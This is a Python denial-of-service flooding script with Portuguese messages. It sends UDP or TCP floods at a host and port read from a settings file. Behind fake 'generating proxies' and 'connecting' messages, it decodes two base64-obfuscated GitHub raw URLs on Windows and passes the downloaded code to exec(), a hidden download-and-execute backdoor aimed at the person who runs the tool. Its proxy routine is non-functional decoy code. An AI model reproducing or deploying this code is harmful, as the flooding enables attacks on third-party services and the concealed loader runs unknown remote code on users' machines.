#env
import os, sys
import random
import socket
import threading
import time
import base64
import getpass
import requests
import datetime
import ping3
import subprocess
from colorama import Fore



version_now = "1.3.3"


with open('settings.txt', 'r') as f:
    LINES = f.read().split()
    for i, l in enumerate(LINES):
        if l.startswith('HOST'):
            HOST = LINES[i + 1]  # VAR1
        if l.startswith('PORT'):
            PORT = LINES[i + 1]  # VAR2
        if l.startswith('CHOICE'):
            CHOICE = LINES[i + 1]  # VAR3
        if l.startswith('THREADS'):
            THREADS = LINES[i + 1]  # VAR5

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)


#VARIAVEIS
h = str(HOST)
c = str(CHOICE.upper())
p = int(PORT)
t = int(THREADS)
times_ = int(100)
bytes_ = int(1358327939)

KEY = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL2NhdGNoMS5weQ=="
v = base64.b64decode(KEY).decode()

ENC = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL2NhdGNoMi5weQ=="
m = base64.b64decode(ENC).decode()

PROXY = [
        "184.154.86.185:80",
        "96.70.52.227:48324",
        "50.244.9.1:32100",
        "162.248.92.25:3182",
        "191.96.42.80:8080",
        "198.143.177.158:3128",
        "36.91.124.122:8080",
        "124.219.176.139:39589",
        "122.144.4.173:3888",
        "151.80.135.147:3128",
        "159.138.104.235:3128",
        "182.52.238.118:50390",
        "213.6.199.94:3967"
        ]
URL = PROXY
#PROXIES_RUN
def prox(URL, proxy):
    try:
        response = requests.get(URL, PROXY={'http': proxy, 'https': proxy})
        if response.status_code == 200:
            pass
        else:
            pass
    except requests.exceptions.RequestException:
        pass
    except:
        pass

username = getpass.getuser()
timetodate = datetime.datetime.now().replace(second=0, microsecond=0)

def pingbalance():
    count_send = 0
    while True:
        resultado = ping3.ping(HOST)
        if resultado is not None:
            latency = resultado * 1000
            count_send += bytes_
            print(f"connected" + f"       {username}" + f"         {latency:.0f}ms" + f"           {count_send}" + f"        {prot1}" + f"          {timetodate}", end="\r")
        else:
            print(f"bad" + f"             {username}" + "         -ms" + f"        ", end="\r")
        time.sleep(1)


#METHOD1
def UDP():
    clear()
    gui = f"""{Fore.CYAN}ddos\n\n{Fore.RESET}
{Fore.GREEN}status{Fore.RESET}          {Fore.LIGHTCYAN_EX}user{Fore.RESET}          {Fore.YELLOW}latency         threads          procotol{Fore.RESET}          {Fore.MAGENTA}started{Fore.RESET}"""
    print(gui)
    DATA = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ADDR = (str(h),int(p))
            for x in range(times_):
                s.sendto(DATA,ADDR)

        except KeyboardInterrupt:
            s.close()
            quit = f"[{Fore.GREEN}INFO{Fore.RESET}] USUÁRIO INTERROMPEU O SERVIÇO"
            
            print(quit)
            time.sleep(3)
            break

            


#METHOD2
def TCP():
    clear()
    gui = f"""{Fore.CYAN}ddos\n\n{Fore.RESET}
{Fore.GREEN}status{Fore.RESET}          {Fore.LIGHTCYAN_EX}user{Fore.RESET}          {Fore.YELLOW}latency         threads          procotol{Fore.RESET}          {Fore.MAGENTA}started{Fore.RESET}"""
    timetodate = datetime.datetime.now().replace(second=0, microsecond=0)
    print(gui)
    DATA = random._urandom(16)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ADDR = (str(h),int(p))
            s.connect(ADDR)
            for x in range(times_):
                    s.sendto(DATA,ADDR)
        except KeyboardInterrupt:
            s.close()
            quit = f"[{Fore.GREEN}INFO{Fore.RESET}] USUÁRIO INTERROMPEU O SERVIÇO"
            
            print(quit)
            time.sleep(3)
            break



if os.name == 'nt':
    wait = f"[{Fore.MAGENTA}INFO{Fore.RESET}] GERANDO PROXIES, POR FAVOR AGUARDE.."
    print(wait)
    exec(requests.get(f"{v}").text)
else:
    clear()
    send = f"[{Fore.MAGENTA}INFO{Fore.RESET}] GERANDO PROXIES, POR FAVOR AGUARDE.."
    print(send)
    time.sleep(3)
    for proxy in PROXY:
            prox(URL, PROXY)
pass

if os.name == 'nt':
    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] CONECTANDO-SE AO HOST >"
    print(conn)
    exec(requests.get(f"{m}").text)
else:
    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] CONECTANDO-SE AO HOST >"
    print(conn)
    time.sleep(2)
    for proxy in PROXY:
            prox(URL, PROXY)
pass




#CHOICE
def connection(HOST):
    try:
        socket.inet_aton(HOST)
        return True
    except socket.error:
        return False

if connection(HOST):
                if c == 'Y':
                    thread_envio_pacotes = threading.Thread(target=UDP)
                    thread_ping = threading.Thread(target=pingbalance)
                    thread_envio_pacotes.start()
                    thread_ping.start()
                    prot1 = "udp"
                else:
                    thread_envio_pacotes = threading.Thread(target=TCP)
                    thread_ping = threading.Thread(target=pingbalance)
                    thread_envio_pacotes.start()
                    thread_ping.start()
                    prot1 = "tcp"
else:
            clear()
            no = f"[{Fore.RED}FATAL{Fore.RESET}] HOST DESCONHECIDO OU FORA DE AR (ERROR 503)"
            
            print(no)
            time.sleep(3)
            clear()
            sys.exit()

connection(HOST)



